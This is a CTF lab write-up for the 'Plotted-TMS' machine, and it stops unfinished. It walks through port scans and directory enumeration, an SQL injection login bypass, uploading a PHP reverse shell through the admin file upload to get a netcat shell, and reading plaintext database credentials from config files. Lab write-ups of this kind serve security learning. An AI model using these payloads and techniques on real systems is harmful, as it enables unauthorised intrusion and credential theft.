<h1 align="center">Challenge 064 - Plotted-TMS </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/31537452-5cdc-4824-9519-c77eeef9b3cf" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

It's been a long tine since I've done a CTF. I hope to gradually get into the grind again. Web Enumerations are fun so I started with an easy one.

## User Flag
We begin with the port scanning process of the attack machine.

```
root@ip-10-112-88-100:~# nmap -sV -p- 10.112.185.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 13:34 UTC
Nmap scan report for ip-10-112-185-160.eu-central-1.compute.internal (10.112.185.160)
Host is up (0.00068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
```

The http website just shows the Apache2 Default Page. We might be able to enumerate the site, as the challenge itself hints to that.

```
root@ip-10-112-88-100:~# gobuster dir -u 10.112.185.160 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.185.160
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://10.112.185.160/admin/]
/.hta                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10918]
/passwd               (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 279]
/shadow               (Status: 200) [Size: 25]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The shadow directory might give us some new insights.

<img width="561" height="128" alt="Bildschirmfoto vom 2026-06-18 15-50-59" src="https://github.com/user-attachments/assets/b1596d94-1074-4358-adc3-30ae7d96aaaa" />

And it did. We see a Base64 encoded string. Let's decode it.

<img width="614" height="489" alt="image" src="https://github.com/user-attachments/assets/48fdeba0-267d-4ca9-b59b-40dc07455aa6" />

A dead end. It was worth a try. Maybe we will have more luck with the admin directory.

<img width="554" height="328" alt="Bildschirmfoto vom 2026-06-18 16-04-25" src="https://github.com/user-attachments/assets/fd2e46a2-5388-46fb-badc-f1702ea21c35" />

There seems to be a file with a private SSH key. We could use that to securely log into the machine. Checking out the file just reveals another Base64 encoded string.

<img width="650" height="493" alt="image" src="https://github.com/user-attachments/assets/d43ce17c-eb7e-4561-8ded-bfcc3d354030" />

Tricked again! Alright I will take the hint to heart and keep on enumerating. And enumerating I did. A lot. I used several different worlists and even tried to enumerate files with extensions through the -x flag, with no success. Attacking the /admin directly also didn't help much. I wasted much more time than I would have liked. Always check your nmap results thoroughly. The output clearly showed that there was another http service on port 445. Let's enumerate it.

```
root@ip-10-112-88-100:~# gobuster dir -u http://10.112.185.160:445 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.185.160:445
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10918]
/management           (Status: 301) [Size: 326] [--> http://10.112.185.160:445/management/]
/server-status        (Status: 403) [Size: 280]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Juicy! Let's see where the management directory takes us.

<img width="1122" height="733" alt="image" src="https://github.com/user-attachments/assets/21a73990-69a3-4387-9bf1-309e6d831011" />

Finally, some meat to chew on. This webpage seems to be a Traffic Offense Management System. There is no functionality that would hint to that, but alright. The Login button begs to be clicked, so we do that.

<img width="1122" height="896" alt="image" src="https://github.com/user-attachments/assets/28c7676c-0497-4aa3-9c4f-ff9e7a77e6e8" />

I was not sure if I should use brute forcing to get the right credentials, but the classic SQL injection *' OR 1=1-- -* in the username input field worked fine.

<img width="1122" height="896" alt="image" src="https://github.com/user-attachments/assets/01cac945-997d-4041-ab71-86f274a38f53" />

We are logged in as the Administrator. I checked out the page for some more hints, but opted on just enumerating the URL again. Seems like that was the right call this time around.

```
root@ip-10-113-67-87:~# gobuster dir -u http://10.113.152.91:445/management/admin/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.152.91:445/management/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/drivers              (Status: 301) [Size: 338] [--> http://10.113.152.91:445/management/admin/drivers/]
/inc                  (Status: 301) [Size: 334] [--> http://10.113.152.91:445/management/admin/inc/]
/index.php            (Status: 200) [Size: 22279]
/maintenance          (Status: 301) [Size: 342] [--> http://10.113.152.91:445/management/admin/maintenance/]
/reports              (Status: 301) [Size: 338] [--> http://10.113.152.91:445/management/admin/reports/]
/user                 (Status: 301) [Size: 335] [--> http://10.113.152.91:445/management/admin/user/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

That's what I thought at first. After attempting to access any of the directories I just got the following error message.

<img width="756" height="306" alt="image" src="https://github.com/user-attachments/assets/d7768931-a102-43ce-9166-b08d0be47a28" />

It probably happened because Gobuster accessed these folders as an unauthenticated guest. The backend script may be coded to expect an active administrator session or specific cookies. If those session tokens are missing, the script crashes and throws a 500 error instead of a redirect. At least that's the assumption. Be it as it may I just tried analyzing the /inc directory first as it may contain highly sensitive configuration, database connections, and helper scripts.

```
root@ip-10-113-67-87:~# gobuster dir -u http://10.113.152.91:445/management/admin/inc -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -x php,txt,bak,inc,conf,config
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.152.91:445/management/admin/inc
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,inc,conf,config,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/header.php           (Status: 500) [Size: 0]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.inc        (Status: 403) [Size: 279]
/.htaccess.conf       (Status: 403) [Size: 279]
/.htaccess.config     (Status: 403) [Size: 279]
/footer.php           (Status: 500) [Size: 2223]
/.                    (Status: 200) [Size: 2022]
/.html.conf           (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.html.config         (Status: 403) [Size: 279]
/.html.bak            (Status: 403) [Size: 279]
/.html.inc            (Status: 403) [Size: 279]
/.html.php            (Status: 403) [Size: 279]
/.html.txt            (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.bak        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.inc        (Status: 403) [Size: 279]
/.htpasswd.conf       (Status: 403) [Size: 279]
/.htpasswd.config     (Status: 403) [Size: 279]
/.htm                 (Status: 403) [Size: 279]
/.htm.config          (Status: 403) [Size: 279]
/.htm.conf            (Status: 403) [Size: 279]
/.htm.php             (Status: 403) [Size: 279]
/.htm.inc             (Status: 403) [Size: 279]
/.htm.txt             (Status: 403) [Size: 279]
/.htm.bak             (Status: 403) [Size: 279]
/.htpasswds           (Status: 403) [Size: 279]
/.htpasswds.txt       (Status: 403) [Size: 279]
/.htpasswds.conf      (Status: 403) [Size: 279]
/.htpasswds.inc       (Status: 403) [Size: 279]
/.htpasswds.php       (Status: 403) [Size: 279]
/.htpasswds.config    (Status: 403) [Size: 279]
/.htpasswds.bak       (Status: 403) [Size: 279]
/navigation.php       (Status: 500) [Size: 284]
/.htgroup.config      (Status: 403) [Size: 279]
/.htgroup.php         (Status: 403) [Size: 279]
/.htgroup.conf        (Status: 403) [Size: 279]
/.htgroup.inc         (Status: 403) [Size: 279]
/.htgroup.bak         (Status: 403) [Size: 279]
/.htgroup             (Status: 403) [Size: 279]
/.htgroup.txt         (Status: 403) [Size: 279]
/wp-forum.phps        (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.bak.txt    (Status: 403) [Size: 279]
/.htaccess.bak.bak    (Status: 403) [Size: 279]
/.htaccess.bak.inc    (Status: 403) [Size: 279]
/.htaccess.bak.config (Status: 403) [Size: 279]
/.htaccess.bak.php    (Status: 403) [Size: 279]
/.htaccess.bak.conf   (Status: 403) [Size: 279]
/.htuser.txt          (Status: 403) [Size: 279]
/.htuser.php          (Status: 403) [Size: 279]
/.htuser.bak          (Status: 403) [Size: 279]
/.htuser              (Status: 403) [Size: 279]
/.htuser.conf         (Status: 403) [Size: 279]
/.htuser.config       (Status: 403) [Size: 279]
/.htuser.inc          (Status: 403) [Size: 279]
/.ht                  (Status: 403) [Size: 279]
/.ht.php              (Status: 403) [Size: 279]
/.ht.config           (Status: 403) [Size: 279]
/.htc                 (Status: 403) [Size: 279]
/.htc.bak             (Status: 403) [Size: 279]
/.ht.conf             (Status: 403) [Size: 279]
/.ht.bak              (Status: 403) [Size: 279]
/.htc.txt             (Status: 403) [Size: 279]
/.htc.php             (Status: 403) [Size: 279]
/.ht.txt              (Status: 403) [Size: 279]
/.ht.inc              (Status: 403) [Size: 279]
/.htc.conf            (Status: 403) [Size: 279]
/.htc.inc             (Status: 403) [Size: 279]
/.htc.config          (Status: 403) [Size: 279]
/.htaccess.old        (Status: 403) [Size: 279]
/.htaccess.old.txt    (Status: 403) [Size: 279]
/.htaccess.old.php    (Status: 403) [Size: 279]
/.htaccess.old.config (Status: 403) [Size: 279]
/.htaccess.old.conf   (Status: 403) [Size: 279]
/.htaccess.old.bak    (Status: 403) [Size: 279]
/.htacess.inc         (Status: 403) [Size: 279]
/.htacess.php         (Status: 403) [Size: 279]
/.htaccess.old.inc    (Status: 403) [Size: 279]
/.htacess.bak         (Status: 403) [Size: 279]
/.htacess.txt         (Status: 403) [Size: 279]
/.htacess.conf        (Status: 403) [Size: 279]
/.htacess             (Status: 403) [Size: 279]
/.htacess.config      (Status: 403) [Size: 279]
Progress: 176872 / 259301 (68.21%)[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g.": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..inc": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..conf": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..config": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..php": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..txt": net/url: invalid control character in URL
[ERROR] parse "http://10.113.152.91:445/management/admin/inc/directory\t\te.g..bak": net/url: invalid control character in URL
Progress: 259294 / 259301 (100.00%)
===============================================================
Finished
===============================================================
```

No luck. Let's just check out the directory in the web page.

<img width="702" height="401" alt="image" src="https://github.com/user-attachments/assets/5a65132f-4ce3-4ec5-b1db-8eeb47a47af0" />

That's more like it. The sess_auth.php is incredibly interesting and is highly likely to be the key to moving forward. 

In PHP web applications, files named *sess_auth.php* (Session Authentication) handle how the application verifies who is logged in, checks user roles (like admin vs. regular user), and controls access to pages. It might explain the Error Code 500 since we will see exactly what session variables or cookies the application requires to let us view the other directories.

Or so I thought. Wrong deduction. I had to think of something else once again and then remembered there was a file upload feature inside the administrative settings. Maybe that could be a pathway for Remote Code Execution (RCE) if we use a web listener like netcat paired with an uploaded script.

<img width="1110" height="797" alt="Bildschirmfoto vom 2026-06-18 18-07-23" src="https://github.com/user-attachments/assets/29853e75-9534-435e-910b-690273b484ad" />

If the file upload setting does not strictly restrict file types, we can upload a script written in PHP (since the server uses Apache and runs .php files). When we navigate to the uploaded file's URL, the Apache server will execute our script instead of just displaying it, allowing us to run system commands.

For our first step we prepare our listener. It will wait for the target server to connect back to us. 

```
root@ip-10-113-67-87:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Now we need a PHP script that tells the target Ubuntu server to open a connection back to our listener. As we use Kali Linux we have an industry-standard script pre-installed. The path should be */usr/share/webshells/php/php-reverse-shell.php*. Another solution is that we just download the php file from pentestmonkey. After that we modify the $ip variable to our attacking machine's IP address and $port to 4444. After that comes the moment of truth where we upload the file and see if we can trigger the shell by visiting the URL. And where is that URL? To find that out we go to the page where the website logo is actively displayed and right-click the image and select Inspect. By looking at the *src* attribute of the *<img>* tag it reveals the exact path and filename modification used by the system.

<img width="1110" height="797" alt="image" src="https://github.com/user-attachments/assets/c9a9281f-f2c8-4048-a90f-297e897af076" />

Got it! Now we check out the URL.

<img width="582" height="374" alt="image" src="https://github.com/user-attachments/assets/f7541c71-b8a0-42da-9188-a9eb1a2f1bb6" />

There it is! Let's trigger the shell.

```
root@ip-10-113-67-87:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.113.152.91 32968
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:48:00 up  1:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

And we are in! As we are running inside a restricted shell ( /bin/sh with job control turned off), our immediate goal is to stabilize our environment and discover the system user accounts to grab the user flag or locate SSH credentials. So before running heavy enumeration commands, let's upgrade our simple shell to a stable Bash shell so it doesn't crash if we hit *Ctrl+C* or try to use tab completion. We run the following commands sequentially in our Netcat terminal.

For the first step we spawn Bash by using Python.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then we background the shell by pressing *Ctrl+Z* on our keyboard.

```
www-data@plotted:/$ ^Z
[1]+  Stopped       
```

In our third step we configure our terminal settings and press enter twice

```
root@ip-10-113-67-87:~# stty raw -echo; fg
nc -lvnp 4444
```

The last step in stabilizing our shell is the setting of environment variables.

```
www-data@plotted:/$ export TERM=x86_64
```

As the user flag is almost always located in the home directory of a legitimate system user, we read the */etc/passwd* file to see who actually owns a home folder on this machine.

```
www-data@plotted:/$ cat /etc/passwd | grep /home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash
```

From what we gathered we can deduce that our primary targets are *plot_admin* and *ubuntu*. As plot_admin has a costumized name matching the hostname ( plotted ), it is highly probable that the user flag is located inside */home/plot_admin/user.txt*

```
www-data@plotted:/$ ls -la /home/plot_admin
total 32
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt
www-data@plotted:/$ cat /home/plot_admin/user.txt
cat: /home/plot_admin/user.txt: Permission denied
```

Still no luck. Seems like we need to shift our focus to something else, like extracting the database configuration details directly from the web server directory. This is the most reliable way to find the password, as web applications require plaintext credentials to connect to their databases. I immediately remembered the /inc folder which contained the sess_auth.php file.

```
www-data@plotted:/$ ls -la /var/www/html/445/management/admin/inc
total 44
drwxr-xr-x 2 www-data www-data 4096 Oct 28  2021 .
drwxr-xr-x 9 www-data www-data 4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 8150 Oct 28  2021 defaultNav.php
-rw-r--r-- 1 www-data www-data 5746 Oct 28  2021 footer.php
-rw-r--r-- 1 www-data www-data 3760 Oct 28  2021 header.php
-rw-r--r-- 1 www-data www-data 6322 Oct 28  2021 navigation.php
-rw-r--r-- 1 www-data www-data  810 Oct 28  2021 sess_auth.php
-rw-r--r-- 1 www-data www-data 3441 Oct 28  2021 topBarNav.php
```

Bingo. We cat the file to see what information we can gather.

```
www-data@plotted:/$ cat /var/www/html/445/management/admin/inc/sess_auth.php   
<?php 
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
else
    $link = "http"; 
$link .= "://"; 
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['REQUEST_URI'];
if(!isset($_SESSION['userdata']) && !strpos($link, 'login.php')){
	redirect('admin/login.php');
}
if(isset($_SESSION['userdata']) && strpos($link, 'login.php')){
	redirect('admin/index.php');
}
$module = array('','admin','faculty','student');
if(isset($_SESSION['userdata']) && (strpos($link, 'index.php') || strpos($link, 'admin/')) && $_SESSION['userdata']['login_type'] !=  1){
	echo "<script>alert('Access Denied!');location.replace('".base_url.$module[$_SESSION['userdata']['login_type']]."');</script>";
    exit;
}
```

This file gives us two very important pieces of information.

The first one being the answer as to why we were getting the HTTP 500 errors. There is a specific line:

```
$_SESSION['userdata']['login_type'] != 1
```

This tells us that the application checks if the logged-in user has a *login_type* value of exactly 1 (which stands for 'admin' in the $module array). If a guest or the wrong user type tries to access those directories, the script blocks them.

Second it confirms the exact directory path on the server. 

As sess_auth.php only handles session logic and does not contain database credentials, the actual database password must be stored in a file that establishes the network connection. Let's look for that database connection file. We find it in the management directory.

```
www-data@plotted:/$ ls -la /var/www/html/445/management          
total 80
drwxr-xr-x 13 www-data www-data 4096 Oct 28  2021 .
drwxr-xr-x  3 www-data www-data 4096 Oct 28  2021 ..
-rw-r--r--  1 www-data www-data  225 Oct 28  2021 .htaccess
-rw-r--r--  1 www-data www-data  198 Oct 28  2021 404.html
-rw-r--r--  1 www-data www-data 1832 Jun 18 17:23 about.html
drwxr-xr-x  9 www-data www-data 4096 Oct 28  2021 admin
drwxr-xr-x  4 www-data www-data 4096 Oct 28  2021 assets
drwxr-xr-x  6 www-data www-data 4096 Oct 28  2021 build
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 classes
-rw-r--r--  1 www-data www-data 1236 Oct 28  2021 config.php
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 database
drwxr-xr-x  5 www-data www-data 4096 Oct 28  2021 dist
-rw-r--r--  1 www-data www-data  747 Oct 28  2021 home.php
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 inc
-rw-r--r--  1 www-data www-data 2590 Oct 28  2021 index.php
-rw-r--r--  1 www-data www-data  651 Oct 28  2021 initialize.php
drwxr-xr-x  4 www-data www-data 4096 Oct 28  2021 libs
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 pages
drwxr-xr-x 61 www-data www-data 4096 Oct 28  2021 plugins
drwxr-xr-x  3 www-data www-data 4096 Jun 18 17:23 uploads
```

In this specific application framework, *config.php* and *initialize.php* handle the core setup, environment constants, and database credentials required to run the web application. 

```
www-data@plotted:/$ cat /var/www/html/445/management/config.php
<?php
ob_start();
ini_set('date.timezone','Asia/Manila');
date_default_timezone_set('Asia/Manila');
session_start();

require_once('initialize.php');
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;

function redirect($url=''){
	if(!empty($url))
	echo '<script>location.href="'.base_url .$url.'"</script>';
}
function validate_image($file){
	if(!empty($file)){
			// exit;
		if(is_file(base_app.$file)){
			return base_url.$file;
		}else{
			return base_url.'dist/img/no-image-available.png';
		}
	}else{
		return base_url.'dist/img/no-image-available.png';
	}
}
function isMobileDevice(){
    $aMobileUA = array(
        '/iphone/i' => 'iPhone', 
        '/ipod/i' => 'iPod', 
        '/ipad/i' => 'iPad', 
        '/android/i' => 'Android', 
        '/blackberry/i' => 'BlackBerry', 
        '/webos/i' => 'Mobile'
    );

    //Return true if Mobile User Agent is detected
    foreach($aMobileUA as $sMobileKey => $sMobileOS){
        if(preg_match($sMobileKey, $_SERVER['HTTP_USER_AGENT'])){
            return true;
        }
    }
    //Otherwise return false..  
    return false;
}
ob_end_flush();
```

The config.php file references the exact file where the configuration is initialized: *require_once('initialize.php');*. It also instantiates the database class from classes/DBConnection.php. The credentials need to be in one of those files.

```
?>www-data@plotted:/$ cat /var/www/html/445/management/initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>
```

There we go. We have what we need. The file contains plaintext database credentials and a developer hash.

- Database Username: tms_user
- Database Password: Password@123
- Developer Username: dev_oretnom
- Developer Password: 5da283a2d990e8d8512cf967df5bc0d0

Since user frequently reuse the same passwords across different services on a Linux system (also called **credential reuse**) we can now test these credentials to gain access via SSH.

As we already discovered two valid SSH users earlier: plot_admin and ubuntu we can try to log into the SSH service on the target machine from our attacking terminal using the password we just found.

// I will get back to this!!!
